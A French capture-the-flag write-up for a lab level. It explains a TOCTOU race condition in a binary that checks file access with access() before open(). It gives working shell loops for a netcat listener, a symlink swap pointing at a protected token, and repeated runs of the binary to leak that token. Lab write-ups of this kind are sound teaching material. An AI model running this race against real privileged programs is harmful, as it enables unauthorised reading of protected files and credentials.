## Level 10

### Analyse
Le binaire ./level10 prend deux arguments : un fichier et un hôte. Il est censé envoyer le contenu du fichier vers l'hôte sur le port 6969, mais seulement si l'utilisateur a les droits de lecture sur ce fichier.

```bash
$ ./level10 token localhost
You don't have access to token
```
En analysant le binaire avec ltrace, on remarque l'utilisation de la fonction access() avant l'ouverture réelle du fichier avec open() :
```bash
ltrace ./level10 token localhost
...
access("/tmp/ic", 4) = -1
...
```

### Exploitation
Il existe une faille de type TOCTOU (Time of Check to Time of Use). Entre le moment où le programme vérifie les droits (access) et le moment où il ouvre le fichier (open), il s'écoule un court laps de temps. Si on parvient à changer la cible du fichier pendant ce micro-intervalle, on peut tromper le programme.

L'attaque nécessite la mise en place de trois processus simultanés pour gagner la "course" (Race Condition).

1. Le Serveur: On utilise nc pour écouter sur le port 6969.
    ```bash
    while true; do nc -l 6969; done
    ```

2. Le Switch (Le lien symbolique) : On crée une boucle qui alterne très rapidement un lien symbolique entre un fichier autorisé (/tmp/ici) et le fichier protégé (token).
    ```bash
   while true; do ln -sf /tmp/ici /tmp/faketoken; ln -sf /home/user/level10/token /tmp/faketoken; done

    ```

3. L'Attaque (L'exécution) : On lance le binaire en boucle sur notre lien symbolique.
    ```bash
   while true; do ./level10 /tmp/faketoken 127.0.0.1; done
    ```

Au bout de quelques instants, le binaire valide l'accès sur /tmp/ici mais ouvre en réalité le fichier token. Le mot de passe s'affiche dans le terminal du serveur Netcat. On utilise ensuite ce mot de passe pour su flag10 et récupérer le flag final via getflag.
